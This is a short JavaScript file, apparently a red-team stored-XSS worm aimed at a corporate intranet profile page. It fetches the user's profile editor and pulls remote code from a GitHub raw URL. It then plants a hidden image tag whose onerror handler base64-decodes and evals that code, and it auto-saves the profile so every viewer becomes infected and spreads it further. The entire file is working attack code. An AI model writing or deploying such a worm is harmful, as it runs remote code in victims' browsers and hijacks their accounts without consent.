function getRndInteger(min, max) {
    return Math.floor(Math.random() * (max - min + 1) ) + min;
  }


var userProfile = $('<iframe />');
var profileHtml = "";
var payload = "";
var payloadURL = "https://raw.githubusercontent.com/eddiezab/custom-profile/master/profile.js?v" + getRndInteger(6000, 65535) + "=" + getRndInteger(6000, 65535);

$.ajax({
    type: "GET",
    async: false,
    url: "https://intranet.ent.cgi.com/pages/EditProfile.aspx",
    success: function (data) {
        profileHtml = data;
    }
});

$.ajax({
    type: "GET",
    async: false,
    cache: false,
    url: payloadURL,
    success: function (data) {
        payload = btoa(data);
    }
});

var temp = $($.parseHTML(profileHtml, null, true));
$(temp).appendTo($(userProfile));
$(userProfile).appendTo("body");

setTimeout(function () {
    var profile_payload = "<p>I support the ATMO Red Team</p><img style='display: none;' src='x' onerror='eval(atob(\"" + payload + "\"));'>";

    if ($('#txtAboutMe').val().indexOf("onerror") == -1) {
        $('#txtAboutMe').val($('#txtAboutMe').val() + profile_payload);
        $(".Profile_Edit_EditProfile_Buttons  .Profile_Edit_LabelClass_Button_Save")[0].click();       
    } else {
        //alert("already pwnd");
    }
    $(userProfile).empty();
}, 1000);